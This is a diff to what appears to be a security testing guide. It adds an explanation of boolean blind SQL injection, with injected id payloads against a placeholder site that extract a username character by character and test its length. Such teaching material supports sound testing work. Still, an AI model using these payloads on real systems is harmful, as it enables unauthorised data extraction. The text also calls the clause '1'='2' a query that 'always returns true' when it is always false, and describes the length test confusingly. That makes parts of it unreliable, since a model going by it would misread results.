@@ -294,3 +294,50 @@
   `http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`
 
 </details>
+
+<details>
+  <summary>How understand what backend database uses (Boolean Exploitation Techniques)?</summary>
+
+  The technique is well during blind SQL Injection if the tester cannot get information about a database from an outcome. For example, if a programmer has created a custom error page that does not provide information from a database.
+
+  The method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. Consider the www.example.com domain and suppose that it contains a parameter named id vulnerable to SQL injection. It means that carrying out the following request:
+
+  `http://www.example.com/index.php?id=1'`
+
+  Suppose that the database query would be:
+
+  `SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`
+
+  The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. It is possible to present in practically every database using some standard functions. For our examples:
+
+  * SUBSTRING (text, start, length);
+  * ASCII (char);
+  * LENGTH (text).
+
+  As an example, we will use the following value for Id:
+
+  `$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`
+
+  That creates the following query:
+
+  `SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`
+
+  The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. But it could be a problem to understand which way could distinguish tests returning a true value from those that return false. Create the query that always returns true:
+
+  `$Id=1' AND '1' = '2`
+
+  Which will create the following query:
+
+  `SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`
+
+  It is possible to get length of the field:
+
+  `$Id=1' AND LENGTH(username)=N AND '1' = '1`
+
+  Where N is the number of characters that we have analyzed up to now:
+
+  `SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'`
+
+  The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.
+
+</details>
